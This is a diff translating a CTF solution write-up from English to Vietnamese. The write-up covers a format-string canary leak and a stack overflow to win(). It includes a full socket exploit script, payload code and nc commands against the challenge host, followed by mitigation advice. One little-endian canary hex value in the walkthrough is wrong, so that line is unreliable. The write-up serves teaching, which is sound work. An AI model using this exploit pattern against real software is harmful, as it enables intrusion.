@@ -1,89 +1,89 @@
-# Challenge 25: FmtString — Solution
+# Thử thách 25: FmtString — Giải pháp
 
-## Vulnerability Type
-**Format String Vulnerability + Stack Canary Bypass (2-stage exploit)**
+## Loại lỗ hổng
+**Format String Vulnerability (Lỗ hổng chuỗi định dạng) + Stack Canary Bypass (Khai thác 2 giai đoạn)**
 
-## Description
-The challenge simulates a C program that calls `printf(user_input)` directly — the classic format string bug. The stack has a canary (random 8-byte value, low byte = `0x00`) that protects the return address. Exploitation requires two stages:
+## Mô tả
+Thử thách này mô phỏng một chương trình C sử dụng lệnh in vô tội vạ `printf(user_input)` — gây ra lỗi chuỗi định dạng Format String kinh điển. Để tăng độ khó, Stack được bảo vệ bởi một Canary (một chuỗi giá trị 8-byte sinh ngẫu nhiên, kết thúc bằng byte null `0x00`) nhằm bảo vệ Return Address không bị ghi đè. Do đó, việc khai thác bắt buộc phải trải qua 2 giai đoạn:
 
-1. **Stage 1** — Use the format string to *leak* the canary value from the stack.
-2. **Stage 2** — Craft a buffer overflow payload that preserves the leaked canary and overwrites the return address to `win()`.
+1. **Giai đoạn 1** — Dùng lỗi Format String để ép chương trình *rò rỉ (leak)* giá trị Canary nằm trên Stack.
+2. **Giai đoạn 2** — Nã một Payload tràn bộ đệm Buffer Overflow chèn đúng giá trị Canary vừa bắt được vào lại vị trí cũ, nhằm qua mặt cơ chế kiểm tra (bypass) rồi mới ghi đè Return Address trỏ về hàm `win()`.
 
-## Vulnerable Code
+## Mã nguồn chứa lỗ hổng
 
 ```python
-# chall.py — simulates printf(user_input)
+# chall.py — Mô phỏng printf(user_input)
 fmt   = input("[fmt]> ").strip()
 result = simulate_printf(fmt, stack)
 print(f"[printf]: {result}")
 ```
 
-The real-world C equivalent:
+Mã C tương đương trong thực tế:
 
 ```c
 char buf[32];
-// ... later ...
-printf(buf);       // VULNERABLE — user controls format string
+// ... lấy input ...
+printf(buf);       // VULNERABLE — Kẻ tấn công kiểm soát được chuỗi định dạng
 ```
 
-## Stack Layout
+## Bố cục ngăn xếp (Stack Layout)
 
-```
-Index (1-based for %N$p)   Content
+```text
+Index (Dùng cho toán tử %N$p)   Content (Nội dung)
 ─────────────────────────────────────────────
-  %1$p   →   0x4141414141414141   (local var A)
-  %2$p   →   0x00007fff5fbff260   (local var B / ptr)
-  %3$p   →   0x0000000000000000   (local var C)
-  %4$p   →   <CANARY>             ← this is what we need!
-  %5$p   →   0x00007fff5fbff120   (saved RBP)
-  %6$p   →   0x000000000040128a   (original return addr)
+  %1$p   →   0x4141414141414141   (Biến nội bộ A)
+  %2$p   →   0x00007fff5fbff260   (Biến nội bộ B / con trỏ pointer)
+  %3$p   →   0x0000000000000000   (Biến nội bộ C)
+  %4$p   →   <CANARY>             ← Đây chính là thứ chúng ta cần!
+  %5$p   →   0x00007fff5fbff120   (Saved RBP)
+  %6$p   →   0x000000000040128a   (Return addr thực tế ban đầu)
   %7$p   →   0x0000000000000001
   %8$p   →   0x0000000000000000
 ```
 
-Canary note: low byte is always `0x00` (used to terminate C strings, making it harder to leak via `%s`).
+*Ghi chú về Canary:* Byte cuối (Least Significant Byte) luôn mang giá trị `0x00` (mục đích là để chặt đứt các chuỗi C-string, làm khó kỹ thuật leak bằng `%s`).
 
-## Exploitation Steps
+## Các bước khai thác (Exploit)
 
-### Stage 1 — Leak the Canary
+### Giai đoạn 1 - Ép rò rỉ Canary (Leak Canary)
 
-Use a **positional format specifier** `%4$p` to read the 4th stack argument (the canary):
+Sử dụng cờ định dạng lấy theo vị trí chỉ định **`%4$p`** để ép lệnh printf đọc tham số thứ 4 trên Stack (chính là Canary):
 
-```
+```text
 [fmt]> %4$p
 [printf]: 0x1234567890abcd00
 ```
 
-The leaked value is the canary. Note the low byte is always `00`.
+Giá trị rò rỉ chính là Canary. Để ý byte cuối cùng luôn là `00`.
 
-### Stage 2 — Build the Overflow Payload
+### Giai đoạn 2 - Xây dựng tải trọng tràn bộ đệm (Overflow Payload)
 
-Stack layout during the vulnerable `strcpy()`:
+Bố cục của Buffer trước lệnh copy `strcpy()`:
+```text
+offset 0x00 : [ buffer          32 bytes ]  ← Lấp đầy 32 ký tự 'A' (0x41)
+offset 0x20 : [ stack canary     8 bytes ]  ← Nhồi lại Canary vừa leak (Định dạng little-endian!)
+offset 0x28 : [ saved RBP        8 bytes ]  ← Ghi đè rác (ví dụ: 0x4242424242424242)
+offset 0x30 : [ return address   8 bytes ]  ← Ép về trỏ tới 0x401337 (WIN_ADDR dạng little-endian)
 ```
-offset 0x00 : [ buffer          32 bytes ]  ← 32× 0x41
-offset 0x20 : [ stack canary     8 bytes ]  ← leaked canary (little-endian!)
-offset 0x28 : [ saved RBP        8 bytes ]  ← anything (e.g. 0x4242424242424242)
-offset 0x30 : [ return address   8 bytes ]  ← 0x401337 (WIN_ADDR) little-endian
-```
 
-**win() address:** `0x401337`  
-**Little-endian:** `37 13 40 00 00 00 00 00`
+**Địa chỉ hàm win():** `0x401337`  
+**Dạng Little-endian:** `37 13 40 00 00 00 00 00`
 
 ```python
 import struct
 
-# Suppose leaked canary = 0x1234567890abcd00
+# Giả sử canary vừa leak được là = 0x1234567890abcd00
 canary = 0x1234567890abcd00
 
-payload  = b"A" * 32                          # fill buffer
-payload += struct.pack("<Q", canary)           # preserve canary exactly
-payload += b"B" * 8                           # saved RBP (anything)
-payload += struct.pack("<Q", 0x401337)        # return address = win()
+payload  = b"A" * 32                          # Lấp đầy buffer 32 bytes
+payload += struct.pack("<Q", canary)          # Đặt lại y hệt canary để lừa cơ chế check
+payload += b"B" * 8                           # Ghi đè Saved RBP bằng rác
+payload += struct.pack("<Q", 0x401337)        # Đè Return address nhảy về hàm win()
 
 print(payload.hex())
 ```
 
-## Complete Exploit Script
+## Khai thác tự động bằng Script
 
 ```python
 import socket
@@ -107,20 +107,20 @@ with socket.create_connection((HOST, PORT)) as s:
     banner = recv_until(s, b"[fmt]>")
     print(banner.decode())
 
-    # ── STAGE 1: leak canary ──────────────────────────────────────
+    # ── STAGE 1: Ép rò rỉ Canary ──────────────────────────────────────
     s.sendall(b"%4$p\n")
     response = recv_until(s, b"[payload]>")
     print(response.decode())
 
     match = re.search(r"\[printf\]: (0x[0-9a-f]+)", response.decode())
     canary = int(match.group(1), 16)
-    print(f"[+] Leaked canary: {hex(canary)}")
+    print(f"[+] Canary thu thập được: {hex(canary)}")
 
-    # ── STAGE 2: overflow with correct canary ─────────────────────
+    # ── STAGE 2: Xả tải trọng tràn bộ đệm có chứa Canary hợp lệ ─────────────────────
     payload  = b"A" * 32                        # buffer
-    payload += struct.pack("<Q", canary)         # canary (must match!)
-    payload += b"B" * 8                          # saved RBP
-    payload += struct.pack("<Q", WIN_ADDR)       # return address
+    payload += struct.pack("<Q", canary)        # Chèn chuẩn canary
+    payload += b"B" * 8                         # Lấp đầy saved RBP
+    payload += struct.pack("<Q", WIN_ADDR)      # Điều khiển return address
 
     print(f"[*] Payload ({len(payload)}B): {payload.hex()}")
     s.sendall(payload.hex().encode() + b"\n")
@@ -133,82 +133,66 @@ with socket.create_connection((HOST, PORT)) as s:
         print(f"[+] Flag: {flag.group()}")
 ```
 
-### One-liner test (manual)
+### Test thủ công qua Console (Manual)
 
 ```bash
-# Stage 1: get canary
+# Stage 1: Lấy Canary
 echo "%4\$p" | nc <host> 1337
 
-# Stage 2: paste canary value, build payload
+# Stage 2: Nhúng Canary vào Payload Hex
 python3 -c "
 import struct
-canary  = 0x<CANARY_FROM_STAGE1>
+canary  = 0x<CANARY_VỪA_LEAK>
 payload = b'A'*32 + struct.pack('<Q', canary) + b'B'*8 + struct.pack('<Q', 0x401337)
 print(payload.hex())
 " | nc <host> 1337
 ```
 
-## Walkthrough (Step by Step)
+## Giải thích toàn cảnh cuộc Tấn công (Walkthrough)
 
-```
-1. Connect → program prints win() address: 0x401337
+```text
+1. Kết nối vào Server → Máy chủ in ra địa chỉ hàm win(): 0x401337
 
-2. Stage 1 input: %4$p
-   Server: [printf]: 0x5e1a2b3c4d5e0000
-   → canary = 0x5e1a2b3c4d5e0000
+2. Nhập dữ liệu Stage 1: %4$p
+   Server đáp: [printf]: 0x5e1a2b3c4d5e0000
+   → Suy ra Canary là = 0x5e1a2b3c4d5e0000
 
-3. Stage 2 payload (hex):
-   41414141414141414141414141414141  (16 bytes of 'A')
-   41414141414141414141414141414141  (16 bytes of 'A')  → 32B buffer
-   005e5e4d3c2b1a5e                  ← canary LE (0x5e1a2b3c4d5e0000)
-   4242424242424242                  ← saved RBP (don't care)
-   3713400000000000                  ← win() addr LE (0x401337)
+3. Tạo Payload Stage 2 (Chuỗi Hex):
+   41414141414141414141414141414141  (16 byte 'A')
+   41414141414141414141414141414141  (16 byte 'A')  → Đầy 32 byte buffer
+   005e5e4d3c2b1a5e                  ← Canary viết xuôi theo Little-Endian (0x5e1a2b3c4d5e0000)
+   4242424242424242                  ← Saved RBP rác
+   3713400000000000                  ← Địa chỉ hàm win() theo Little-Endian (0x401337)
 
-4. Server:
+4. Phản hồi Server:
    [+] Canary OK: 0x5e1a2b3c4d5e0000
    [i] Return address: 0x401337
    [!] Jumping to win()!
    [*] FLAG: FCTF{...}
 ```
 
-## Why is There a Canary?
+## Chức năng của Canary là gì?
 
-The canary is placed between the local buffer and the saved return address. On overflow, an attacker **must** overwrite the canary to reach the return address. If the canary value changes, the program detects the overflow and aborts.
+Stack Canary (hay Stack Cookie) là một giá trị kiểm tra được hệ điều hành chèn vào ngăn xếp nằm ngay giữa **Local Buffer** và **Return Address**. Khi Buffer bị tràn, hacker muốn chạm tay tới mảng Return Address thì **bắt buộc** phải chà đạp qua Canary. Trước khi kết thúc hàm (vào lệnh `ret`), hệ thống sẽ check lại giá trị Canary này. Nếu nó bị lệch đi (thay đổi giá trị), chương trình sẽ phát báo động phát hiện tràn bộ đệm (stack smashing detected) và chết ngay lập tức (abort).
 
+```text
+Nếu không có lỗ hổng Format String: Hacker không biết Canary là gì → Đập tràn mù sẽ gây thay đổi Canary → Chương trình phát hiện và tự sát.
+Nếu có lỗ hổng Format String:       Hacker leak được Canary → Lưu trữ nó và ghép vào lại Payload nguyên si → Bypass hoàn hảo lớp bảo vệ Canary.
 ```
-Without format string bug: attacker cannot know canary → overflow detected
-With format string bug:    attacker leaks canary → preserves it → bypasses protection
-```
 
-## Mitigation
+## Biện pháp phòng ngừa (Mitigation)
 
 ```c
-// 1. Always use the format argument
-printf("%s", user_input);    // safe
-printf(user_input);          // NEVER do this!
+// 1. Luôn sử dụng %s cố định thay vì ném user_input thẳng vào tham số format
+printf("%s", user_input);    // An toàn tuyệt đối
+printf(user_input);          // Lỗi kinh hoàng, ĐỪNG BAO GIỜ làm thế này!
 
-// 2. Enable stack canaries at compile time
+// 2. Ép trình biên dịch kích hoạt cơ chế Stack Canary bảo vệ
 // gcc -fstack-protector-strong -fstack-protector-all
 
-// 3. Use _FORTIFY_SOURCE=2 for additional checks
+// 3. Tăng cường kiểm tra kích thước với cờ FORTIFY_SOURCE
 // gcc -D_FORTIFY_SOURCE=2
 
-// 4. Enable RELRO, PIE, NX
+// 4. Kích hoạt toàn bộ giáp bảo vệ hiện đại (RELRO, PIE, NX)
 // gcc -Wl,-z,relro -Wl,-z,now -fpie -pie -fno-execstack
 ```
-
-## Concepts Demonstrated
-
-| Concept | Explanation |
-|---|---|
-| Format string bug | `printf(user_input)` lets user specify format, read arbitrary stack values |
-| `%N$p` | Positional specifier — reads the N-th argument off the stack |
-| Stack canary | Random value between buffer and return address, checked on return |
-| Canary bypass | Leak via format string, then preserve it in overflow payload |
-| Little-endian | Multi-byte values stored LSB first on x86-64 |
-
-## References
-- [Format String Exploitation Tutorial](https://axcheron.github.io/exploit-101-format-strings/)
-- [pwntools documentation](https://docs.pwntools.com/)
-- [Stack Canaries — How they work](https://ctf101.org/binary-exploitation/stack-canaries/)
-- [PayloadsAllTheThings — Format String](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Format%20String%20Injection)
